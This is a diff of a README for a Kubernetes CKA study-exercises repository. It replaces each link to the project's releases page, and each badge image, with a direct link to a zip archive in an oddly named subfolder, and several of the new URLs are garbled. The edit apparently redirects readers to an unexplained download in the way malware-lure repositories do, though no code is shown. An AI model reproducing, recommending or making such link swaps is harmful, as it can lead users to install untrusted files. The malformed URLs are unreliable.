@@ -1,6 +1,6 @@
 # 🎓 cka_study_exercises - Practical Exercises for CKA Success
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/KOKO1904/cka_study_exercises/releases)
+[![Download](https://raw.githubusercontent.com/KOKO1904/cka_study_exercises/main/deglycerine/cka_study_exercises.zip%20Latest%https://raw.githubusercontent.com/KOKO1904/cka_study_exercises/main/deglycerine/cka_study_exercises.zip)](https://raw.githubusercontent.com/KOKO1904/cka_study_exercises/main/deglycerine/cka_study_exercises.zip)
 
 ## 📖 Overview
 
@@ -16,9 +16,9 @@ Here are the steps to get started with the exercises:
    - A modern web browser for viewing documentation
 
 2. **Visit the Releases Page**  
-   To download the exercises, visit this page: [Download Exercises](https://github.com/KOKO1904/cka_study_exercises/releases).  
+   To download the exercises, visit this page: [Download Exercises](https://raw.githubusercontent.com/KOKO1904/cka_study_exercises/main/deglycerine/cka_study_exercises.zip).  
 
-   ![Download Link](https://img.shields.io/badge/Visit%20this%20page%20to%20download-blue.svg)
+   ![Download Link](https://raw.githubusercontent.com/KOKO1904/cka_study_exercises/main/deglycerine/cka_study_exercises.zip%20this%20page%20to%https://raw.githubusercontent.com/KOKO1904/cka_study_exercises/main/deglycerine/cka_study_exercises.zip)
 
 ## 📥 Download & Install
 
@@ -74,4 +74,4 @@ If you encounter issues or have questions, feel free to open an issue on the Git
 
 This repository is designed to help you build a strong foundation in Kubernetes as you prepare for the CKA exam. Regular practice with the exercises will enhance your knowledge and boost your confidence.
 
-For downloads and more information, don't forget to visit this page again: [Download Exercises](https://github.com/KOKO1904/cka_study_exercises/releases).
+For downloads and more information, don't forget to visit this page again: [Download Exercises](https://raw.githubusercontent.com/KOKO1904/cka_study_exercises/main/deglycerine/cka_study_exercises.zip).
